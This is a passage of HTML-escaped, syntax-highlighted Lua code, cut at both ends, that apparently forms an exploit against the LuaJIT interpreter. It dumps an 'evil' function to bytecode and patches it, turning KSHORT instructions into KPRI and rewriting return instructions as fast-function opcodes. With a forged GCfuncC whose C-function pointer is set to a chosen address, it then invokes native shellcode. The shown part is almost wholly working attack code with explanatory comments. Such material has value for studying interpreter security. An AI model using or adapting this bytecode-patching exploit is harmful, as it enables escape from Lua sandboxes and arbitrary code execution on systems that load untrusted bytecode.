    &lt;span class=&quot;kr&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mctab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;--[[&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    local mcarea = mctab[1]&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    --mctab[0] = 0xdeadbeef / 2^52 / 2^1022&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    mctab[0] = 0&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    mctab[1] = asaddr / 2^52 / 2^1022&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    mctab[2] = mctab[1]&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    mctab[3] = mctab[1]&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    mctab[3] = 0xdeadbeef / 2^52 / 2^1022&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    mctab[4] = 2^12 / 2^52 / 2^1022&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    --while mctab[0] == 0 do end&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    local i = 1&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    while i &amp;lt; 0x1000000 do &lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;        i = i + 1 &lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;        --print(i)&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    end&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    --]]&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- The following three lines construct a GCfuncC object&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- whose lua_CFunction field is set to asaddr. A fixed&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- offset from the address of the empty string gives us&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- the global_State::bc_cfunc_int field.&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fshellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ub4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;low32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;132&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;ub4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fshellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32760&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- Turned into KPRI(func)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- Finally, we invoke the shellcode (and pass it some values&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- which allow it to remove the page at asaddr from the list&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- of mcode areas).&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fshellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mctab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mcarea&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;inner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;-- Some helpers for manipulating bytecode:&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ffi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ffi&quot;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bit&quot;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSHORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KPRI&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;-- Dump the as-written evil function to bytecode:&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;estr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;string.dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ffi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;uint8_t[?]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;estr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;estr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;-- Helper function to read a ULEB128 from p:&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read_uleb128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;then&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;
    &lt;span class=&quot;kr&quot;&gt;repeat&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lshift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;band&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;127&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;kr&quot;&gt;until&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;-- The dumped bytecode contains several prototypes: one for &quot;evil&quot;&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;-- itself, and one for every (transitive) inner function. We step&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;-- through each prototype in turn, and tweak some of them.&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;do&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_uleb128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;then&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pend&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numparams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;framesize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sizeuv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;read_uleb128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;read_uleb128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sizebc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_uleb128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ffi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;uint16_t*&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sizebc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numparams&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sizeuv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;then&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- This branch picks out the &quot;inner&quot; function.&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- The first thing we do is change what the 0th upvalue&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- points at:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;uv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- Then we go through and change everything which was written&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- as &quot;local_variable = -327XX&quot; in the source to instead be&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- a KPRI instruction:&lt;/span&gt;
    &lt;span class=&quot;kr&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sizebc&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;do&lt;/span&gt;
      &lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSHORT&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;then&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ffi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;int16_t*&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32749&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;then&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;bc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KPRI&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;bc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
          &lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32749&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;then&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;-- the `cdata = -32749` line in source also tweaks&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;-- the two instructions after it:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;bc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;bc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
          &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
        &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
      &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;bc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
    &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;elseif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sizebc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;then&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- As written, the s_byte, s_char, and s_sub functions each&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- contain a single &quot;return&quot; instruction. We replace said&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- instruction with the corresponding fast-function instruction.&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;bc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;147&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numparams&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;bc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;band&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numparams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pend&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;fromhex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
